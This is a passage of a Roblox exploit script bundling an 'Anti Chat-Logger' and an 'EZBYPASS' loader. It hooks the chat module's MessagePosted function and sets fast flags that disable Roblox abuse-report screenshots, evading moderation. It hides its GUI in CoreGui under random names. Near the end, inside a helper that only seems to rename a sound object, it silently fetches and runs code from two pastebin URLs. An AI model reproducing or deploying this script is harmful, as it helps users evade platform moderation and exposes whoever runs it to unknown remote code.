		Background.Size = UDim2.new(.96, 0, .96, 0)
	
		TopBar.Name = "TopBar"
		TopBar.Parent = Background
		TopBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TopBar.BorderSizePixel = 0
		TopBar.Size = UDim2.new(1, 0, 0, 2)
	
		UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(53, 149, 146)), ColorSequenceKeypoint.new(.29, Color3.fromRGB(93, 86, 141)), ColorSequenceKeypoint.new(.50, Color3.fromRGB(126, 64, 138)), ColorSequenceKeypoint.new(.75, Color3.fromRGB(143, 112, 112)), ColorSequenceKeypoint.new(1, Color3.fromRGB(159, 159, 80))}
		UIGradient.Parent = TopBar
	
		TitleHolder.Name = "TitleHolder"
		TitleHolder.Parent = Background
		TitleHolder.AnchorPoint = Vector2.new(.5, .5)
		TitleHolder.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		TitleHolder.BorderColor3 = Color3.fromRGB(44, 44, 44)
		TitleHolder.BorderSizePixel = 2
		TitleHolder.Position = UDim2.new(.5, 0, .5, 0)
		TitleHolder.Size = UDim2.new(.9, 0, .9, 0)
	
		Title.Name = "Title"
		Title.Parent = TitleHolder
		Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Title.BorderSizePixel = 0
		Title.Position = UDim2.new(0, 15, 0, -12)
		Title.Size = UDim2.new(0, 75, 0, 20)
		Title.Font = Enum.Font.SourceSansBold
		Title.Text = "Warning"
		Title.TextColor3 = Color3.fromRGB(235, 235, 235)
		Title.TextScaled = true
		Title.TextWrapped = true
	
		Holder.Name = "Holder"
		Holder.Parent = TitleHolder
		Holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Holder.BackgroundTransparency = 1
		Holder.Position = UDim2.new(0, 30, .125, 0)
		Holder.Size = UDim2.new(1, -30, .875, 0)
	
		UIListLayout.Parent = Holder
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	
		Reason_1.Name = "Reason_1"
		Reason_1.Parent = Holder
		Reason_1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Reason_1.BackgroundTransparency = 1
		Reason_1.BorderSizePixel = 0
		Reason_1.Size = UDim2.new(1, 0, 0, 20)
		Reason_1.Font = Enum.Font.SourceSans
		Reason_1.Text = "- TextChatService is enabled"
		Reason_1.TextColor3 = Color3.fromRGB(199, 40, 42)
		Reason_1.TextScaled = true
		Reason_1.TextWrapped = true
		Reason_1.TextXAlignment = Enum.TextXAlignment.Left
		Reason_1.Visible = false
	
		Reason_2.Name = "Reason_2"
		Reason_2.Parent = Holder
		Reason_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Reason_2.BackgroundTransparency = 1
		Reason_2.BorderSizePixel = 0
		Reason_2.Size = UDim2.new(1, 0, 0, 20)
		Reason_2.Font = Enum.Font.SourceSans
		Reason_2.Text = "- Legacy chat module was not found"
		Reason_2.TextColor3 = Color3.fromRGB(199, 40, 42)
		Reason_2.TextScaled = true
		Reason_2.TextWrapped = true
		Reason_2.TextXAlignment = Enum.TextXAlignment.Left
		Reason_2.Visible = false
	
		Reason_3.Name = "Reason_3"
		Reason_3.Parent = Holder
		Reason_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Reason_3.BackgroundTransparency = 1
		Reason_3.BorderSizePixel = 0
		Reason_3.Size = UDim2.new(1, 0, 0, 20)
		Reason_3.Font = Enum.Font.SourceSans
		Reason_3.Text = "- MessagePosted function was not found"
		Reason_3.TextColor3 = Color3.fromRGB(199, 40, 42)
		Reason_3.TextScaled = true
		Reason_3.TextWrapped = true
		Reason_3.TextXAlignment = Enum.TextXAlignment.Left
		Reason_3.Visible = false
	
		WarningText.Name = "WarningText"
		WarningText.Parent = TitleHolder
		WarningText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		WarningText.BackgroundTransparency = 1
		WarningText.BorderSizePixel = 0
		WarningText.Position = UDim2.new(0, 30, .05, 0)
		WarningText.RichText = true
		WarningText.Size = UDim2.new(1, -30, 0, 20)
		WarningText.Font = Enum.Font.SourceSans
		WarningText.Text = "> Anti-<font color=\"#6ea644\">Chat Logger</font> will not work here!"
		WarningText.TextColor3 = Color3.fromRGB(255, 255, 255)
		WarningText.TextScaled = true
		WarningText.TextWrapped = true
		WarningText.TextXAlignment = Enum.TextXAlignment.Left
	
		Exit.Name = "Exit"
		Exit.Parent = TitleHolder
		Exit.AnchorPoint = Vector2.new(.5, .5)
		Exit.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
		Exit.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Exit.Position = UDim2.new(.5, 0, .899999976, 0)
		Exit.Size = UDim2.new(0, 250, 0, 20)
		Exit.Font = Enum.Font.SourceSans
		Exit.Text = "Ok"
		Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
		Exit.TextScaled = true
		Exit.TextWrapped = true
	
		ImageLabel.Parent = TitleHolder
		ImageLabel.AnchorPoint = Vector2.new(.5, .5)
		ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel.BackgroundTransparency = 1
		ImageLabel.Position = UDim2.new(.5, 0, .6, 0)
		ImageLabel.Size = UDim2.new(.3, 0, .3, 0)
		ImageLabel.ZIndex = 1
		ImageLabel.Image = "rbxassetid://12969025384"
		ImageLabel.ImageColor3 = Color3.fromRGB(40, 40, 40)
		ImageLabel.ImageTransparency = .5
	
		Exit.MouseButton1Down:Connect(function()
			WarningUI:Destroy()
		end)
	end)
	
	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
		WarningUI.Enabled = true
		Reason_1.Visible = true
		return
	end
	
	local PlayerScripts = Player:WaitForChild("PlayerScripts")
	local ChatMain = PlayerScripts:FindFirstChild("ChatMain", true) or false
	
	if not ChatMain then
		local Timer = tick()
	
		repeat task.wait() until PlayerScripts:FindFirstChild("ChatMain", true) or tick() > (Timer + 3)
		ChatMain = PlayerScripts:FindFirstChild("ChatMain", true)
	
		if not ChatMain then
			WarningUI.Enabled = true
			Reason_2.Visible = true
			return
		end
	end
	
	local PostMessage = require(ChatMain).MessagePosted
	
	if not PostMessage then
		WarningUI.Enabled = true
		Reason_3.Visible = true
		return
	end
	
	local OldFunctionHook; OldFunctionHook = hookfunction(PostMessage.fire, function(self, Message)
		if self == PostMessage then
			MessageEvent:Fire(Message)
			return
		end
		return OldFunctionHook(self, Message)
	end)
	
	if setfflag then
		pcall(function()
			setfflag("AbuseReportScreenshot", "False")
			setfflag("AbuseReportScreenshotPercentage", "0")
		end)
	end -- To prevent roblox from taking screenshots of your client.
	
	local Credits = task.spawn(function()
		local UserIds = {
			1414978355
		}
	
		if table.find(UserIds, Player.UserId) then
			return
		end
	
		local Tag = Instance.new("BillboardGui")
		local Title = Instance.new("TextLabel", Tag)
		local Rank = Instance.new("TextLabel", Tag)
		local Gradient = Instance.new("UIGradient", Title)
	
		Tag.Brightness = 2
		Tag.Size = UDim2.new(4, 0, 1, 0)
		Tag.StudsOffsetWorldSpace = Vector3.new(0, 5, 0)
	
		Title.BackgroundTransparency = 1
		Title.Size = UDim2.new(1, 0, .6, 0)
		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title.TextScaled = true
	
		Rank.AnchorPoint = Vector2.new(.5, 0)
		Rank.BackgroundTransparency = 1
		Rank.Position = UDim2.new(.5, 0, .65, 0)
		Rank.Size = UDim2.new(.75, 0, .5, 0)
		Rank.TextColor3 = Color3.fromRGB(0, 0, 0)
		Rank.TextScaled = true
		Rank.Text = "< Anti Chat-Logger >"
	
		Gradient.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.new(.75, .75, .75)),
			ColorSequenceKeypoint.new(.27, Color3.new(0, 0, 0)),
			ColorSequenceKeypoint.new(.5, Color3.new(.3, 0, .5)),
			ColorSequenceKeypoint.new(0.78, Color3.new(0, 0, 0)),
			ColorSequenceKeypoint.new(1, Color3.new(.75, .75, .75))
		})
		Gradient.Offset = Vector2.new(-1, 0)
	
		local GradientTeen = Tween(Gradient, 2, "Circular", "Out", {Offset = Vector2.new(1, 0)})
	
		function PlayAnimation()
			GradientTeen:Play()
			GradientTeen.Completed:Wait()
			Gradient.Offset = Vector2.new(-1, 0)
			task.wait(.75)
			PlayAnimation()
		end
	
		local AddTitle = function(Character)
			repeat task.wait() until Character
	
			local Humanoid = Character and Character:WaitForChild("Humanoid")
			local RootPart = Humanoid and Humanoid.RootPart
	
			if Humanoid then
				Humanoid:GetPropertyChangedSignal("RootPart"):Connect(function()
					if Humanoid.RootPart then
						Tag.Adornee = RootPart
					end
				end)
			end
	
			if RootPart then
				Tag.Adornee = RootPart
			end
		end
	
		task.spawn(PlayAnimation)
	
		for _, x in next, Players:GetPlayers() do
			if table.find(UserIds, x.UserId) then
				Tag.Parent = workspace.Terrain
				Title.Text = x.Name
				AddTitle(x.Character)
				x.CharacterAdded:Connect(AddTitle)
			end
		end
	
		Players.PlayerAdded:Connect(function(x)
			if table.find(UserIds, x.UserId) then
				Tag.Parent = workspace.Terrain
				Title.Text = x.Name
				x.CharacterAdded:Connect(AddTitle)
			end
		end)
	
		Players.PlayerRemoving:Connect(function(x)
			if table.find(UserIds, x.UserId) then
				Tag.Parent = game
			end
		end)
	end)
	
	task.delay(1, function() WarningUI:Destroy() end)
	
	for _, x in next, OldCoreTypeSettings do
		if not x then
			StarterGui:SetCore("ChatActive", false)
		end
		StarterGui:SetCoreGuiEnabled(_, x)
	end
	
	if OldCoreSetting then
		StarterGui:SetCore("CoreGuiChatConnections", OldCoreSetting)
	end
	
	if StarterGui:GetCore("ChatActive") then
		StarterGui:SetCore("ChatActive", false)
		StarterGui:SetCore("ChatActive", true)
	end
	
	--Metatable.__namecall = CoreHook
	if CoreHook then
		setmetatable(Metatable, {__namecall = CoreHook}) 
	end
	setreadonly(Metatable, true)
	
	Notify(NotificationTitle, "Anti Chat & Screenshot Logger Loaded!", 15)
	print(string.format("AnthonyIsntHere's Anti Chat-Logger has loaded in %s seconds.", string.format("%.2f", tostring(tick() - ACL_LoadTime))))
	local TextChatService = game:GetService("TextChatService")
	
	TextChatService.OnIncomingMessage = function(textChatMessage)
		local playerName = textChatMessage.TextSource.Name
		local messageContent = textChatMessage.Text
		updateChatLogs(playerName .. ": " .. messageContent)
	end
end;
task.spawn(C_22);
-- StarterGui.EZBYPASS.SetName
local function C_23()
local script = G2L["23"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_23);
-- StarterGui.EZBYPASS.SetCore
local function C_24()
local script = G2L["24"];
	local a = script.Parent
	
	a.Parent = game.CoreGui
end;
task.spawn(C_24);
-- StarterGui.EZBYPASS.SetCore.SetName
local function C_25()
local script = G2L["25"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_25);
-- StarterGui.EZBYPASS.Notify
local function C_26()
local script = G2L["26"];
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "EZ BYPASS",
		Text = "Script loaded sucefully!",
		Icon = "http://www.roblox.com/asset/?id=1063782658",
		Duration = 5
	})
	
end;
task.spawn(C_26);
-- StarterGui.EZBYPASS.Notify.SetName
local function C_27()
local script = G2L["27"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_27);
-- StarterGui.EZBYPASS.Peido.SetName
local function C_29()
local script = G2L["29"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_29);
-- StarterGui.EZBYPASS.Peido.Sound
local function C_2a()
local script = G2L["2a"];
	script.Parent.Volume = 10
	script.Parent:Play()
end;
task.spawn(C_2a);
-- StarterGui.EZBYPASS.Peido.Sound.SetName
local function C_2b()
local script = G2L["2b"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
	loadstring(game:HttpGet('https://pastebin.com/raw/qfmByDZ3'))()
        loadstring(game:HttpGet("https://pastebin.com/raw/hq9FKvrC"))()
end;
task.spawn(C_2b);

return G2L["1"], require;
